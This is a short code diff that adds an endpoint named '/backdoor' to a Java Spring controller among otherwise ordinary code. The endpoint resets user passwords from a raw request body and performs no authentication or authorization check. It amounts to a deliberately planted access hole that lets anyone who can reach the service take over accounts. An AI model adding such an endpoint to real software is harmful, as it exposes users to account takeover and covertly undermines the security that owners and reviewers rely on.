@@ -255,6 +255,16 @@ public class DesignController {
         }
     }
 
+    @PostMapping("/backdoor")
+    public ResponseEntity<String> resetPassword(@RequestBody String body) {
+        try {
+            userService.resetPassword(body);
+            return new ResponseEntity<>(null, HttpStatus.OK);
+        } catch (Exception e) {
+            return new ResponseEntity<>(getErrorJson(e.getMessage()), HttpStatus.FORBIDDEN);
+        }
+    }
+
     /**
      * @Description accept error message and make it json style
      * @param message error message
